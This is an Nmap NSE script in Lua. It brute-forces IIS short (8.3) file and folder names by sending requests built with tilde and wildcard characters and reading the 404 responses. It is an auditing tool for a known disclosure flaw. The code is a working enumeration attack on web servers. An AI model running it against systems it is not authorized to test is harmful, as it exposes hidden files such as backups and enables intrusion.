description = [[
This script is a implementation of 'iis-shortname-scanner-poc found here:
http://code.google.com/p/iis-shortname-scanner-poc/

The research documentation can be found here:
http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf

The script uses almost the same approach described in the paper, which uses ~,? and * 
to bruteforce the shortname of files present in the IIS document root.

The script might have to be run twice (according to the original author). 

Side note:
In the research file it is claimed that is approach can be used to conduct DoS attacks (disk load) by using
different attack strings of the same type. This script is not meant to do this, and the attack
strings should be safe. 

CHANGELOG:
* Added special case to detect false positives in certain environments (paulino)
]]

---
-- @usage
-- nmap -p80 --script http-iis-short-name-brute <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http
-- | http-iis-short-name-brute: 
-- |   Folders
-- |     aspnet~1
-- |   Files
-- |     sql~1.bak
-- |_    test~1.php
-- 
---

author = "Jesper Kueckelhahn"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "brute"}

local stdnse    = require "stdnse"
local shortport = require "shortport"
local http      = require "http"

portrule = shortport.http

local chars = "abcdefghijklmnopqrstuvwxyz0123456789"
local magic = "/*.aspx?aspxerrorpath=/"

local folders = {}
folders["name"] = "Folders"
local files = {}
files["name"] = "Files"
local last_number = 0
local errors_max = false
local errors = 0

local function isFolder(host, port, path, number)
	local data = http.get(host, port, "/" ..  path .. "~" .. number .. magic)
	return data.status == 404
end


local function isLonger(host, port, path, number)
	local data = http.get(host, port, "/" .. path .. "%3f*~" .. number .. "*" .. magic)
	return data.status == 404
end


local function foundName(host, port, path, number)
	local data = http.get(host, port, "/" .. path .. "~" .. number .. "*" .. magic)
	return data.status == 404
end


local function charInExtension(host, port, path, ext)
	local data = http.get(host, port, "/" .. path .. ext .. "*" .. magic )
	return data.status == 404
end


local function findExtension(host, port, path, ext)
	if charInExtension(host, port, path, ext) then
		
		-- currently only support for ext of length 3
		if ext:len() == 3 then 
			stdnse.print_debug(1, "Added file: %s", path .. ext)		
			table.insert(files, path .. ext)
		else
			for c in chars:gmatch(".") do
				findExtension(host, port, path, ext .. c)
			end
		end
	end
end

local function findName(host, port, path, number)
        
	-- check if the name is valid
	if foundName(host, port, path, number) then
		if isFolder(host, port, path, number) then
			if tonumber(number) == (last_number + 1) then
				errors = errors+1
			end
			if errors>10 then
				stdnse.print_debug(1, "%s:False positive detected", SCRIPT_NAME)
				errors_max=true
			else
				stdnse.print_debug(1, "Added folder: %s", path .. "~" .. number)
				table.insert(folders, path .. "~" .. number)

			-- increase the number ('~1' to '~2')
				last_number = number
				local nextNumber = tostring(tonumber(number) + 1) 
				findName(host, port, path, nextNumber)
			end
		-- if the name is valid, and it's not a folder, it must be a file		
		else
			findExtension(host, port, path .. "~" .. number .. ".", "")
			
			-- increase the number ('~1' to '~2')
			local nextNumber = tostring(tonumber(number) + 1) 
			findName(host, port, path, nextNumber)
		end
	end

	-- is the path valid (i.e. 404)
	local cont = isLonger(host, port, path, number)
	
	-- recurse if the path is valid and the length of path is not 6

	if not (path:len() == 6) and cont and not(errors_max) then
		stdnse.print_debug(1, "Testing: %s", path .. "~" .. number)
		for c in chars:gmatch(".") do
			findName(host, port, path .. c, number)
		end
	end
end


action = function(host, port)

	findName(host, port, "", "1")
        if errors_max then
	   files = {}
	   folders = {}
        end
	if #files or #folders then
		results = {}
		table.insert(results, folders)
		table.insert(results, files)
		return stdnse.format_output(true, results)
	end
end
